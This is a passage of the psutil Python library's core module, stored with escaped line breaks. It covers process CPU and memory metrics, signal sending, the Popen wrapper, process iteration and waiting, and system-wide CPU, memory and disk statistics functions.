the ppid_map is\n                    # constructed, there may be rare instances where\n                    # there\'s a cycle in the recorded process "tree".\n                    continue\n                seen.add(pid)\n                for child_pid in reverse_ppid_map[pid]:\n                    try:\n                        child = Process(child_pid)\n                        # if child happens to be older than its parent\n                        # (self) it means child\'s PID has been reused\n                        intime = self.create_time() <= child.create_time()\n                        if intime:\n                            ret.append(child)\n                            stack.append(child_pid)\n                    except (NoSuchProcess, ZombieProcess):\n                        pass\n        return ret\n\n    def cpu_percent(self, interval=None):\n        """Return a float representing the current process CPU\n        utilization as a percentage.\n\n        When *interval* is 0.0 or None (default) compares process times\n        to system CPU times elapsed since last call, returning\n        immediately (non-blocking). That means that the first time\n        this is called it will return a meaningful 0.0 value.\n\n        When *interval* is > 0.0 compares process times to system CPU\n        times elapsed before and after the interval (blocking).\n\n        In this case is recommended for accuracy that this function\n        be called with at least 0.1 seconds between calls.\n\n        A value > 100.0 can be returned in case of processes running\n        multiple threads on different CPU cores.\n\n        The returned value is explicitly NOT split evenly between\n        all available logical CPUs. This means that a busy loop process\n        running on a system with 2 logical CPUs will be reported as\n        having 100% CPU utilization instead of 50%.\n\n        Examples:\n\n          >>> import psutil\n          >>> p = psutil.Process(os.getpid())\n          >>> # blocking\n          >>> p.cpu_percent(interval=1)\n          2.0\n          >>> # non-blocking (percentage since last call)\n          >>> p.cpu_percent(interval=None)\n          2.9\n          >>>\n        """\n        blocking = interval is not None and interval > 0.0\n        if interval is not None and interval < 0:\n            raise ValueError("interval is not positive (got %r)" % interval)\n        num_cpus = cpu_count() or 1\n\n        def timer():\n            return _timer() * num_cpus\n\n        if blocking:\n            st1 = timer()\n            pt1 = self._proc.cpu_times()\n            time.sleep(interval)\n            st2 = timer()\n            pt2 = self._proc.cpu_times()\n        else:\n            st1 = self._last_sys_cpu_times\n            pt1 = self._last_proc_cpu_times\n            st2 = timer()\n            pt2 = self._proc.cpu_times()\n            if st1 is None or pt1 is None:\n                self._last_sys_cpu_times = st2\n                self._last_proc_cpu_times = pt2\n                return 0.0\n\n        delta_proc = (pt2.user - pt1.user) + (pt2.system - pt1.system)\n        delta_time = st2 - st1\n        # reset values for next call in case of interval == None\n        self._last_sys_cpu_times = st2\n        self._last_proc_cpu_times = pt2\n\n        try:\n            # This is the utilization split evenly between all CPUs.\n            # E.g. a busy loop process on a 2-CPU-cores system at this\n            # point is reported as 50% instead of 100%.\n            overall_cpus_percent = ((delta_proc / delta_time) * 100)\n        except ZeroDivisionError:\n            # interval was too low\n            return 0.0\n        else:\n            # Note 1:\n            # in order to emulate "top" we multiply the value for the num\n            # of CPU cores. This way the busy process will be reported as\n            # having 100% (or more) usage.\n            #\n            # Note 2:\n            # taskmgr.exe on Windows differs in that it will show 50%\n            # instead.\n            #\n            # Note 3:\n            # a percentage > 100 is legitimate as it can result from a\n            # process with multiple threads running on different CPU\n            # cores (top does the same), see:\n            # http://stackoverflow.com/questions/1032357\n            # https://github.com/giampaolo/psutil/issues/474\n            single_cpu_percent = overall_cpus_percent * num_cpus\n            return round(single_cpu_percent, 1)\n\n    @memoize_when_activated\n    def cpu_times(self):\n        """Return a (user, system, children_user, children_system)\n        namedtuple representing the accumulated process time, in\n        seconds.\n        This is similar to os.times() but per-process.\n        On macOS and Windows children_user and children_system are\n        always set to 0.\n        """\n        return self._proc.cpu_times()\n\n    @memoize_when_activated\n    def memory_info(self):\n        """Return a namedtuple with variable fields depending on the\n        platform, representing memory information about the process.\n\n        The "portable" fields available on all plaforms are `rss` and `vms`.\n\n        All numbers are expressed in bytes.\n        """\n        return self._proc.memory_info()\n\n    @_common.deprecated_method(replacement="memory_info")\n    def memory_info_ex(self):\n        return self.memory_info()\n\n    def memory_full_info(self):\n        """This method returns the same information as memory_info(),\n        plus, on some platform (Linux, macOS, Windows), also provides\n        additional metrics (USS, PSS and swap).\n        The additional metrics provide a better representation of actual\n        process memory usage.\n\n        Namely USS is the memory which is unique to a process and which\n        would be freed if the process was terminated right now.\n\n        It does so by passing through the whole process address.\n        As such it usually requires higher user privileges than\n        memory_info() and is considerably slower.\n        """\n        return self._proc.memory_full_info()\n\n    def memory_percent(self, memtype="rss"):\n        """Compare process memory to total physical system memory and\n        calculate process memory utilization as a percentage.\n        *memtype* argument is a string that dictates what type of\n        process memory you want to compare against (defaults to "rss").\n        The list of available strings can be obtained like this:\n\n        >>> psutil.Process().memory_info()._fields\n        (\'rss\', \'vms\', \'shared\', \'text\', \'lib\', \'data\', \'dirty\', \'uss\', \'pss\')\n        """\n        valid_types = list(_psplatform.pfullmem._fields)\n        if memtype not in valid_types:\n            raise ValueError("invalid memtype %r; valid types are %r" % (\n                memtype, tuple(valid_types)))\n        fun = self.memory_info if memtype in _psplatform.pmem._fields else \\\n            self.memory_full_info\n        metrics = fun()\n        value = getattr(metrics, memtype)\n\n        # use cached value if available\n        total_phymem = _TOTAL_PHYMEM or virtual_memory().total\n        if not total_phymem > 0:\n            # we should never get here\n            raise ValueError(\n                "can\'t calculate process memory percent because "\n                "total physical system memory is not positive (%r)"\n                % total_phymem)\n        return (value / float(total_phymem)) * 100\n\n    if hasattr(_psplatform.Process, "memory_maps"):\n        def memory_maps(self, grouped=True):\n            """Return process\' mapped memory regions as a list of namedtuples\n            whose fields are variable depending on the platform.\n\n            If *grouped* is True the mapped regions with the same \'path\'\n            are grouped together and the different memory fields are summed.\n\n            If *grouped* is False every mapped region is shown as a single\n            entity and the namedtuple will also include the mapped region\'s\n            address space (\'addr\') and permission set (\'perms\').\n            """\n            it = self._proc.memory_maps()\n            if grouped:\n                d = {}\n                for tupl in it:\n                    path = tupl[2]\n                    nums = tupl[3:]\n                    try:\n                        d[path] = map(lambda x, y: x + y, d[path], nums)\n                    except KeyError:\n                        d[path] = nums\n                nt = _psplatform.pmmap_grouped\n                return [nt(path, *d[path]) for path in d]  # NOQA\n            else:\n                nt = _psplatform.pmmap_ext\n                return [nt(*x) for x in it]\n\n    def open_files(self):\n        """Return files opened by process as a list of\n        (path, fd) namedtuples including the absolute file name\n        and file descriptor number.\n        """\n        return self._proc.open_files()\n\n    def connections(self, kind=\'inet\'):\n        """Return socket connections opened by process as a list of\n        (fd, family, type, laddr, raddr, status) namedtuples.\n        The *kind* parameter filters for connections that match the\n        following criteria:\n\n        +------------+----------------------------------------------------+\n        | Kind Value | Connections using                                  |\n        +------------+----------------------------------------------------+\n        | inet       | IPv4 and IPv6                                      |\n        | inet4      | IPv4                                               |\n        | inet6      | IPv6                                               |\n        | tcp        | TCP                                                |\n        | tcp4       | TCP over IPv4                                      |\n        | tcp6       | TCP over IPv6                                      |\n        | udp        | UDP                                                |\n        | udp4       | UDP over IPv4                                      |\n        | udp6       | UDP over IPv6                                      |\n        | unix       | UNIX socket (both UDP and TCP protocols)           |\n        | all        | the sum of all the possible families and protocols |\n        +------------+----------------------------------------------------+\n        """\n        return self._proc.connections(kind)\n\n    # --- signals\n\n    if POSIX:\n        def _send_signal(self, sig):\n            assert not self.pid < 0, self.pid\n            if self.pid == 0:\n                # see "man 2 kill"\n                raise ValueError(\n                    "preventing sending signal to process with PID 0 as it "\n                    "would affect every process in the process group of the "\n                    "calling process (os.getpid()) instead of PID 0")\n            try:\n                os.kill(self.pid, sig)\n            except ProcessLookupError:\n                if OPENBSD and pid_exists(self.pid):\n                    # We do this because os.kill() lies in case of\n                    # zombie processes.\n                    raise ZombieProcess(self.pid, self._name, self._ppid)\n                else:\n                    self._gone = True\n                    raise NoSuchProcess(self.pid, self._name)\n            except PermissionError:\n                raise AccessDenied(self.pid, self._name)\n\n    @_assert_pid_not_reused\n    def send_signal(self, sig):\n        """Send a signal *sig* to process pre-emptively checking\n        whether PID has been reused (see signal module constants) .\n        On Windows only SIGTERM is valid and is treated as an alias\n        for kill().\n        """\n        if POSIX:\n            self._send_signal(sig)\n        else:  # pragma: no cover\n            self._proc.send_signal(sig)\n\n    @_assert_pid_not_reused\n    def suspend(self):\n        """Suspend process execution with SIGSTOP pre-emptively checking\n        whether PID has been reused.\n        On Windows this has the effect ot suspending all process threads.\n        """\n        if POSIX:\n            self._send_signal(signal.SIGSTOP)\n        else:  # pragma: no cover\n            self._proc.suspend()\n\n    @_assert_pid_not_reused\n    def resume(self):\n        """Resume process execution with SIGCONT pre-emptively checking\n        whether PID has been reused.\n        On Windows this has the effect of resuming all process threads.\n        """\n        if POSIX:\n            self._send_signal(signal.SIGCONT)\n        else:  # pragma: no cover\n            self._proc.resume()\n\n    @_assert_pid_not_reused\n    def terminate(self):\n        """Terminate the process with SIGTERM pre-emptively checking\n        whether PID has been reused.\n        On Windows this is an alias for kill().\n        """\n        if POSIX:\n            self._send_signal(signal.SIGTERM)\n        else:  # pragma: no cover\n            self._proc.kill()\n\n    @_assert_pid_not_reused\n    def kill(self):\n        """Kill the current process with SIGKILL pre-emptively checking\n        whether PID has been reused.\n        """\n        if POSIX:\n            self._send_signal(signal.SIGKILL)\n        else:  # pragma: no cover\n            self._proc.kill()\n\n    def wait(self, timeout=None):\n        """Wait for process to terminate and, if process is a children\n        of os.getpid(), also return its exit code, else None.\n        On Windows there\'s no such limitation (exit code is always\n        returned).\n\n        If the process is already terminated immediately return None\n        instead of raising NoSuchProcess.\n\n        If *timeout* (in seconds) is specified and process is still\n        alive raise TimeoutExpired.\n\n        To wait for multiple Process(es) use psutil.wait_procs().\n        """\n        if timeout is not None and not timeout >= 0:\n            raise ValueError("timeout must be a positive integer")\n        if self._exitcode is not _SENTINEL:\n            return self._exitcode\n        self._exitcode = self._proc.wait(timeout)\n        return self._exitcode\n\n\n# The valid attr names which can be processed by Process.as_dict().\n_as_dict_attrnames = set(\n    [x for x in dir(Process) if not x.startswith(\'_\') and x not in\n     [\'send_signal\', \'suspend\', \'resume\', \'terminate\', \'kill\', \'wait\',\n      \'is_running\', \'as_dict\', \'parent\', \'parents\', \'children\', \'rlimit\',\n      \'memory_info_ex\', \'oneshot\']])\n\n\n# =====================================================================\n# --- Popen class\n# =====================================================================\n\n\nclass Popen(Process):\n    """Same as subprocess.Popen, but in addition it provides all\n    psutil.Process methods in a single class.\n    For the following methods which are common to both classes, psutil\n    implementation takes precedence:\n\n    * send_signal()\n    * terminate()\n    * kill()\n\n    This is done in order to avoid killing another process in case its\n    PID has been reused, fixing BPO-6973.\n\n      >>> import psutil\n      >>> from subprocess import PIPE\n      >>> p = psutil.Popen(["python", "-c", "print \'hi\'"], stdout=PIPE)\n      >>> p.name()\n      \'python\'\n      >>> p.uids()\n      user(real=1000, effective=1000, saved=1000)\n      >>> p.username()\n      \'giampaolo\'\n      >>> p.communicate()\n      (\'hi\\n\', None)\n      >>> p.terminate()\n      >>> p.wait(timeout=2)\n      0\n      >>>\n    """\n\n    def __init__(self, *args, **kwargs):\n        # Explicitly avoid to raise NoSuchProcess in case the process\n        # spawned by subprocess.Popen terminates too quickly, see:\n        # https://github.com/giampaolo/psutil/issues/193\n        self.__subproc = subprocess.Popen(*args, **kwargs)\n        self._init(self.__subproc.pid, _ignore_nsp=True)\n\n    def __dir__(self):\n        return sorted(set(dir(Popen) + dir(subprocess.Popen)))\n\n    def __enter__(self):\n        if hasattr(self.__subproc, \'__enter__\'):\n            self.__subproc.__enter__()\n        return self\n\n    def __exit__(self, *args, **kwargs):\n        if hasattr(self.__subproc, \'__exit__\'):\n            return self.__subproc.__exit__(*args, **kwargs)\n        else:\n            if self.stdout:\n                self.stdout.close()\n            if self.stderr:\n                self.stderr.close()\n            try:\n                # Flushing a BufferedWriter may raise an error.\n                if self.stdin:\n                    self.stdin.close()\n            finally:\n                # Wait for the process to terminate, to avoid zombies.\n                self.wait()\n\n    def __getattribute__(self, name):\n        try:\n            return object.__getattribute__(self, name)\n        except AttributeError:\n            try:\n                return object.__getattribute__(self.__subproc, name)\n            except AttributeError:\n                raise AttributeError("%s instance has no attribute \'%s\'"\n                                     % (self.__class__.__name__, name))\n\n    def wait(self, timeout=None):\n        if self.__subproc.returncode is not None:\n            return self.__subproc.returncode\n        ret = super(Popen, self).wait(timeout)\n        self.__subproc.returncode = ret\n        return ret\n\n\n# =====================================================================\n# --- system processes related functions\n# =====================================================================\n\n\ndef pids():\n    """Return a list of current running PIDs."""\n    global _LOWEST_PID\n    ret = sorted(_psplatform.pids())\n    _LOWEST_PID = ret[0]\n    return ret\n\n\ndef pid_exists(pid):\n    """Return True if given PID exists in the current process list.\n    This is faster than doing "pid in psutil.pids()" and\n    should be preferred.\n    """\n    if pid < 0:\n        return False\n    elif pid == 0 and POSIX:\n        # On POSIX we use os.kill() to determine PID existence.\n        # According to "man 2 kill" PID 0 has a special meaning\n        # though: it refers to <<every process in the process\n        # group of the calling process>> and that is not we want\n        # to do here.\n        return pid in pids()\n    else:\n        return _psplatform.pid_exists(pid)\n\n\n_pmap = {}\n\n\ndef process_iter(attrs=None, ad_value=None):\n    """Return a generator yielding a Process instance for all\n    running processes.\n\n    Every new Process instance is only created once and then cached\n    into an internal table which is updated every time this is used.\n\n    Cached Process instances are checked for identity so that you\'re\n    safe in case a PID has been reused by another process, in which\n    case the cached instance is updated.\n\n    The sorting order in which processes are yielded is based on\n    their PIDs.\n\n    *attrs* and *ad_value* have the same meaning as in\n    Process.as_dict(). If *attrs* is specified as_dict() is called\n    and the resulting dict is stored as a \'info\' attribute attached\n    to returned Process instance.\n    If *attrs* is an empty list it will retrieve all process info\n    (slow).\n    """\n    global _pmap\n\n    def add(pid):\n        proc = Process(pid)\n        if attrs is not None:\n            proc.info = proc.as_dict(attrs=attrs, ad_value=ad_value)\n        pmap[proc.pid] = proc\n        return proc\n\n    def remove(pid):\n        pmap.pop(pid, None)\n\n    pmap = _pmap.copy()\n    a = set(pids())\n    b = set(pmap.keys())\n    new_pids = a - b\n    gone_pids = b - a\n    for pid in gone_pids:\n        remove(pid)\n    try:\n        ls = sorted(list(pmap.items()) + list(dict.fromkeys(new_pids).items()))\n        for pid, proc in ls:\n            try:\n                if proc is None:  # new process\n                    yield add(pid)\n                else:\n                    # use is_running() to check whether PID has been\n                    # reused by another process in which case yield a\n                    # new Process instance\n                    if proc.is_running():\n                        if attrs is not None:\n                            proc.info = proc.as_dict(\n                                attrs=attrs, ad_value=ad_value)\n                        yield proc\n                    else:\n                        yield add(pid)\n            except NoSuchProcess:\n                remove(pid)\n            except AccessDenied:\n                # Process creation time can\'t be determined hence there\'s\n                # no way to tell whether the pid of the cached process\n                # has been reused. Just return the cached version.\n                if proc is None and pid in pmap:\n                    try:\n                        yield pmap[pid]\n                    except KeyError:\n                        # If we get here it is likely that 2 threads were\n                        # using process_iter().\n                        pass\n                else:\n                    raise\n    finally:\n        _pmap = pmap\n\n\ndef wait_procs(procs, timeout=None, callback=None):\n    """Convenience function which waits for a list of processes to\n    terminate.\n\n    Return a (gone, alive) tuple indicating which processes\n    are gone and which ones are still alive.\n\n    The gone ones will have a new *returncode* attribute indicating\n    process exit status (may be None).\n\n    *callback* is a function which gets called every time a process\n    terminates (a Process instance is passed as callback argument).\n\n    Function will return as soon as all processes terminate or when\n    *timeout* occurs.\n    Differently from Process.wait() it will not raise TimeoutExpired if\n    *timeout* occurs.\n\n    Typical use case is:\n\n     - send SIGTERM to a list of processes\n     - give them some time to terminate\n     - send SIGKILL to those ones which are still alive\n\n    Example:\n\n    >>> def on_terminate(proc):\n    ...     print("process {} terminated".format(proc))\n    ...\n    >>> for p in procs:\n    ...    p.terminate()\n    ...\n    >>> gone, alive = wait_procs(procs, timeout=3, callback=on_terminate)\n    >>> for p in alive:\n    ...     p.kill()\n    """\n    def check_gone(proc, timeout):\n        try:\n            returncode = proc.wait(timeout=timeout)\n        except TimeoutExpired:\n            pass\n        except _SubprocessTimeoutExpired:\n            pass\n        else:\n            if returncode is not None or not proc.is_running():\n                # Set new Process instance attribute.\n                proc.returncode = returncode\n                gone.add(proc)\n                if callback is not None:\n                    callback(proc)\n\n    if timeout is not None and not timeout >= 0:\n        msg = "timeout must be a positive integer, got %s" % timeout\n        raise ValueError(msg)\n    gone = set()\n    alive = set(procs)\n    if callback is not None and not callable(callback):\n        raise TypeError("callback %r is not a callable" % callable)\n    if timeout is not None:\n        deadline = _timer() + timeout\n\n    while alive:\n        if timeout is not None and timeout <= 0:\n            break\n        for proc in alive:\n            # Make sure that every complete iteration (all processes)\n            # will last max 1 sec.\n            # We do this because we don\'t want to wait too long on a\n            # single process: in case it terminates too late other\n            # processes may disappear in the meantime and their PID\n            # reused.\n            max_timeout = 1.0 / len(alive)\n            if timeout is not None:\n                timeout = min((deadline - _timer()), max_timeout)\n                if timeout <= 0:\n                    break\n                check_gone(proc, timeout)\n            else:\n                check_gone(proc, max_timeout)\n        alive = alive - gone\n\n    if alive:\n        # Last attempt over processes survived so far.\n        # timeout == 0 won\'t make this function wait any further.\n        for proc in alive:\n            check_gone(proc, 0)\n        alive = alive - gone\n\n    return (list(gone), list(alive))\n\n\n# =====================================================================\n# --- CPU related functions\n# =====================================================================\n\n\ndef cpu_count(logical=True):\n    """Return the number of logical CPUs in the system (same as\n    os.cpu_count() in Python 3.4).\n\n    If *logical* is False return the number of physical cores only\n    (e.g. hyper thread CPUs are excluded).\n\n    Return None if undetermined.\n\n    The return value is cached after first call.\n    If desired cache can be cleared like this:\n\n    >>> psutil.cpu_count.cache_clear()\n    """\n    if logical:\n        ret = _psplatform.cpu_count_logical()\n    else:\n        ret = _psplatform.cpu_count_cores()\n    if ret is not None and ret < 1:\n        ret = None\n    return ret\n\n\ndef cpu_times(percpu=False):\n    """Return system-wide CPU times as a namedtuple.\n    Every CPU time represents the seconds the CPU has spent in the\n    given mode. The namedtuple\'s fields availability varies depending on the\n    platform:\n\n     - user\n     - system\n     - idle\n     - nice (UNIX)\n     - iowait (Linux)\n     - irq (Linux, FreeBSD)\n     - softirq (Linux)\n     - steal (Linux >= 2.6.11)\n     - guest (Linux >= 2.6.24)\n     - guest_nice (Linux >= 3.2.0)\n\n    When *percpu* is True return a list of namedtuples for each CPU.\n    First element of the list refers to first CPU, second element\n    to second CPU and so on.\n    The order of the list is consistent across calls.\n    """\n    if not percpu:\n        return _psplatform.cpu_times()\n    else:\n        return _psplatform.per_cpu_times()\n\n\ntry:\n    _last_cpu_times = cpu_times()\nexcept Exception:\n    # Don\'t want to crash at import time.\n    _last_cpu_times = None\n\ntry:\n    _last_per_cpu_times = cpu_times(percpu=True)\nexcept Exception:\n    # Don\'t want to crash at import time.\n    _last_per_cpu_times = None\n\n\ndef _cpu_tot_time(times):\n    """Given a cpu_time() ntuple calculates the total CPU time\n    (including idle time).\n    """\n    tot = sum(times)\n    if LINUX:\n        # On Linux guest times are already accounted in "user" or\n        # "nice" times, so we subtract them from total.\n        # Htop does the same. References:\n        # https://github.com/giampaolo/psutil/pull/940\n        # http://unix.stackexchange.com/questions/178045\n        # https://github.com/torvalds/linux/blob/\n        #     447976ef4fd09b1be88b316d1a81553f1aa7cd07/kernel/sched/\n        #     cputime.c#L158\n        tot -= getattr(times, "guest", 0)  # Linux 2.6.24+\n        tot -= getattr(times, "guest_nice", 0)  # Linux 3.2.0+\n    return tot\n\n\ndef _cpu_busy_time(times):\n    """Given a cpu_time() ntuple calculates the busy CPU time.\n    We do so by subtracting all idle CPU times.\n    """\n    busy = _cpu_tot_time(times)\n    busy -= times.idle\n    # Linux: "iowait" is time during which the CPU does not do anything\n    # (waits for IO to complete). On Linux IO wait is *not* accounted\n    # in "idle" time so we subtract it. Htop does the same.\n    # References:\n    # https://github.com/torvalds/linux/blob/\n    #     447976ef4fd09b1be88b316d1a81553f1aa7cd07/kernel/sched/cputime.c#L244\n    busy -= getattr(times, "iowait", 0)\n    return busy\n\n\ndef _cpu_times_deltas(t1, t2):\n    assert t1._fields == t2._fields, (t1, t2)\n    field_deltas = []\n    for field in _psplatform.scputimes._fields:\n        field_delta = getattr(t2, field) - getattr(t1, field)\n        # CPU times are always supposed to increase over time\n        # or at least remain the same and that\'s because time\n        # cannot go backwards.\n        # Surprisingly sometimes this might not be the case (at\n        # least on Windows and Linux), see:\n        # https://github.com/giampaolo/psutil/issues/392\n        # https://github.com/giampaolo/psutil/issues/645\n        # https://github.com/giampaolo/psutil/issues/1210\n        # Trim negative deltas to zero to ignore decreasing fields.\n        # top does the same. Reference:\n        # https://gitlab.com/procps-ng/procps/blob/v3.3.12/top/top.c#L5063\n        field_delta = max(0, field_delta)\n        field_deltas.append(field_delta)\n    return _psplatform.scputimes(*field_deltas)\n\n\ndef cpu_percent(interval=None, percpu=False):\n    """Return a float representing the current system-wide CPU\n    utilization as a percentage.\n\n    When *interval* is > 0.0 compares system CPU times elapsed before\n    and after the interval (blocking).\n\n    When *interval* is 0.0 or None compares system CPU times elapsed\n    since last call or module import, returning immediately (non\n    blocking). That means the first time this is called it will\n    return a meaningless 0.0 value which you should ignore.\n    In this case is recommended for accuracy that this function be\n    called with at least 0.1 seconds between calls.\n\n    When *percpu* is True returns a list of floats representing the\n    utilization as a percentage for each CPU.\n    First element of the list refers to first CPU, second element\n    to second CPU and so on.\n    The order of the list is consistent across calls.\n\n    Examples:\n\n      >>> # blocking, system-wide\n      >>> psutil.cpu_percent(interval=1)\n      2.0\n      >>>\n      >>> # blocking, per-cpu\n      >>> psutil.cpu_percent(interval=1, percpu=True)\n      [2.0, 1.0]\n      >>>\n      >>> # non-blocking (percentage since last call)\n      >>> psutil.cpu_percent(interval=None)\n      2.9\n      >>>\n    """\n    global _last_cpu_times\n    global _last_per_cpu_times\n    blocking = interval is not None and interval > 0.0\n    if interval is not None and interval < 0:\n        raise ValueError("interval is not positive (got %r)" % interval)\n\n    def calculate(t1, t2):\n        times_delta = _cpu_times_deltas(t1, t2)\n        all_delta = _cpu_tot_time(times_delta)\n        busy_delta = _cpu_busy_time(times_delta)\n\n        try:\n            busy_perc = (busy_delta / all_delta) * 100\n        except ZeroDivisionError:\n            return 0.0\n        else:\n            return round(busy_perc, 1)\n\n    # system-wide usage\n    if not percpu:\n        if blocking:\n            t1 = cpu_times()\n            time.sleep(interval)\n        else:\n            t1 = _last_cpu_times\n            if t1 is None:\n                # Something bad happened at import time. We\'ll\n                # get a meaningful result on the next call. See:\n                # https://github.com/giampaolo/psutil/pull/715\n                t1 = cpu_times()\n        _last_cpu_times = cpu_times()\n        return calculate(t1, _last_cpu_times)\n    # per-cpu usage\n    else:\n        ret = []\n        if blocking:\n            tot1 = cpu_times(percpu=True)\n            time.sleep(interval)\n        else:\n            tot1 = _last_per_cpu_times\n            if tot1 is None:\n                # Something bad happened at import time. We\'ll\n                # get a meaningful result on the next call. See:\n                # https://github.com/giampaolo/psutil/pull/715\n                tot1 = cpu_times(percpu=True)\n        _last_per_cpu_times = cpu_times(percpu=True)\n        for t1, t2 in zip(tot1, _last_per_cpu_times):\n            ret.append(calculate(t1, t2))\n        return ret\n\n\n# Use separate global vars for cpu_times_percent() so that it\'s\n# independent from cpu_percent() and they can both be used within\n# the same program.\n_last_cpu_times_2 = _last_cpu_times\n_last_per_cpu_times_2 = _last_per_cpu_times\n\n\ndef cpu_times_percent(interval=None, percpu=False):\n    """Same as cpu_percent() but provides utilization percentages\n    for each specific CPU time as is returned by cpu_times().\n    For instance, on Linux we\'ll get:\n\n      >>> cpu_times_percent()\n      cpupercent(user=4.8, nice=0.0, system=4.8, idle=90.5, iowait=0.0,\n                 irq=0.0, softirq=0.0, steal=0.0, guest=0.0, guest_nice=0.0)\n      >>>\n\n    *interval* and *percpu* arguments have the same meaning as in\n    cpu_percent().\n    """\n    global _last_cpu_times_2\n    global _last_per_cpu_times_2\n    blocking = interval is not None and interval > 0.0\n    if interval is not None and interval < 0:\n        raise ValueError("interval is not positive (got %r)" % interval)\n\n    def calculate(t1, t2):\n        nums = []\n        times_delta = _cpu_times_deltas(t1, t2)\n        all_delta = _cpu_tot_time(times_delta)\n        # "scale" is the value to multiply each delta with to get percentages.\n        # We use "max" to avoid division by zero (if all_delta is 0, then all\n        # fields are 0 so percentages will be 0 too. all_delta cannot be a\n        # fraction because cpu times are integers)\n        scale = 100.0 / max(1, all_delta)\n        for field_delta in times_delta:\n            field_perc = field_delta * scale\n            field_perc = round(field_perc, 1)\n            # make sure we don\'t return negative values or values over 100%\n            field_perc = min(max(0.0, field_perc), 100.0)\n            nums.append(field_perc)\n        return _psplatform.scputimes(*nums)\n\n    # system-wide usage\n    if not percpu:\n        if blocking:\n            t1 = cpu_times()\n            time.sleep(interval)\n        else:\n            t1 = _last_cpu_times_2\n            if t1 is None:\n                # Something bad happened at import time. We\'ll\n                # get a meaningful result on the next call. See:\n                # https://github.com/giampaolo/psutil/pull/715\n                t1 = cpu_times()\n        _last_cpu_times_2 = cpu_times()\n        return calculate(t1, _last_cpu_times_2)\n    # per-cpu usage\n    else:\n        ret = []\n        if blocking:\n            tot1 = cpu_times(percpu=True)\n            time.sleep(interval)\n        else:\n            tot1 = _last_per_cpu_times_2\n            if tot1 is None:\n                # Something bad happened at import time. We\'ll\n                # get a meaningful result on the next call. See:\n                # https://github.com/giampaolo/psutil/pull/715\n                tot1 = cpu_times(percpu=True)\n        _last_per_cpu_times_2 = cpu_times(percpu=True)\n        for t1, t2 in zip(tot1, _last_per_cpu_times_2):\n            ret.append(calculate(t1, t2))\n        return ret\n\n\ndef cpu_stats():\n    """Return CPU statistics."""\n    return _psplatform.cpu_stats()\n\n\nif hasattr(_psplatform, "cpu_freq"):\n\n    def cpu_freq(percpu=False):\n        """Return CPU frequency as a namedtuple including current,\n        min and max frequency expressed in Mhz.\n\n        If *percpu* is True and the system supports per-cpu frequency\n        retrieval (Linux only) a list of frequencies is returned for\n        each CPU. If not a list with one element is returned.\n        """\n        ret = _psplatform.cpu_freq()\n        if percpu:\n            return ret\n        else:\n            num_cpus = float(len(ret))\n            if num_cpus == 0:\n                return None\n            elif num_cpus == 1:\n                return ret[0]\n            else:\n                currs, mins, maxs = 0.0, 0.0, 0.0\n                set_none = False\n                for cpu in ret:\n                    currs += cpu.current\n                    # On Linux if /proc/cpuinfo is used min/max are set\n                    # to None.\n                    if LINUX and cpu.min is None:\n                        set_none = True\n                        continue\n                    mins += cpu.min\n                    maxs += cpu.max\n\n                current = currs / num_cpus\n\n                if set_none:\n                    min_ = max_ = None\n                else:\n                    min_ = mins / num_cpus\n                    max_ = maxs / num_cpus\n\n                return _common.scpufreq(current, min_, max_)\n\n    __all__.append("cpu_freq")\n\n\nif hasattr(os, "getloadavg") or hasattr(_psplatform, "getloadavg"):\n    # Perform this hasattr check once on import time to either use the\n    # platform based code or proxy straight from the os module.\n    if hasattr(os, "getloadavg"):\n        getloadavg = os.getloadavg\n    else:\n        getloadavg = _psplatform.getloadavg\n\n    __all__.append("getloadavg")\n\n\n# =====================================================================\n# --- system memory related functions\n# =====================================================================\n\n\ndef virtual_memory():\n    """Return statistics about system memory usage as a namedtuple\n    including the following fields, expressed in bytes:\n\n     - total:\n       total physical memory available.\n\n     - available:\n       the memory that can be given instantly to processes without the\n       system going into swap.\n       This is calculated by summing different memory values depending\n       on the platform and it is supposed to be used to monitor actual\n       memory usage in a cross platform fashion.\n\n     - percent:\n       the percentage usage calculated as (total - available) / total * 100\n\n     - used:\n        memory used, calculated differently depending on the platform and\n        designed for informational purposes only:\n        macOS: active + wired\n        BSD: active + wired + cached\n        Linux: total - free\n\n     - free:\n       memory not being used at all (zeroed) that is readily available;\n       note that this doesn\'t reflect the actual memory available\n       (use \'available\' instead)\n\n    Platform-specific fields:\n\n     - active (UNIX):\n       memory currently in use or very recently used, and so it is in RAM.\n\n     - inactive (UNIX):\n       memory that is marked as not used.\n\n     - buffers (BSD, Linux):\n       cache for things like file system metadata.\n\n     - cached (BSD, macOS):\n       cache for various things.\n\n     - wired (macOS, BSD):\n       memory that is marked to always stay in RAM. It is never moved to disk.\n\n     - shared (BSD):\n       memory that may be simultaneously accessed by multiple processes.\n\n    The sum of \'used\' and \'available\' does not necessarily equal total.\n    On Windows \'available\' and \'free\' are the same.\n    """\n    global _TOTAL_PHYMEM\n    ret = _psplatform.virtual_memory()\n    # cached for later use in Process.memory_percent()\n    _TOTAL_PHYMEM = ret.total\n    return ret\n\n\ndef swap_memory():\n    """Return system swap memory statistics as a namedtuple including\n    the following fields:\n\n     - total:   total swap memory in bytes\n     - used:    used swap memory in bytes\n     - free:    free swap memory in bytes\n     - percent: the percentage usage\n     - sin:     no. of bytes the system has swapped in from disk (cumulative)\n     - sout:    no. of bytes the system has swapped out from disk (cumulative)\n\n    \'sin\' and \'sout\' on Windows are meaningless and always set to 0.\n    """\n    return _psplatform.swap_memory()\n\n\n# =====================================================================\n# --- disks/paritions related functions\n# =====================================================================\n\n\ndef disk_usage(path):\n    """Return disk usage statistics about the given *path* as a\n    namedtuple including total, used and free space expressed in bytes\n    plus the percentage usage.\n    """\n    return _psplatform.disk_usage(path)\n\n\ndef disk_partitions(all=False):\n    """Return mounted partitions as a list of\n    (device, mountpoint, fstype, opts) namedtuple.\n    \'opts\' field is a raw string separated by commas indicating mount\n    options which may vary depending on the platform.\n\n    If *all* parameter is False return physical devices only and ignore\n    all others.\n    """\n    def pathconf(path, name):\n        try:\n            return os.pathconf(path, name)\n        except (OSError, AttributeError):\n            pass\n\n    ret = _psplatform.disk_partitions(all)\n    if POSIX:\n        new = []\n        for item in ret:\n            nt = item._replace(\n                maxfile=pathconf(item.mountpoint, \'PC_NAME_MAX\'),\n                maxpath=pathconf(item.mountpoint, \'PC_PATH_MAX\'))\n            new.append(nt)\n        return new\n    else:\n        return ret\n\n\ndef disk_io_counters(perdisk=False, nowrap=True):\n    """Return system disk I/O statistics as a namedtuple including\n    the following fields:\n\n     - read_count:  number of reads\n     - write_count: number of writes\n     - read_bytes:  number of bytes read\n     - write_bytes: number of bytes written\n     - read_time:   time spent reading from disk (in ms)\n     - write_time:  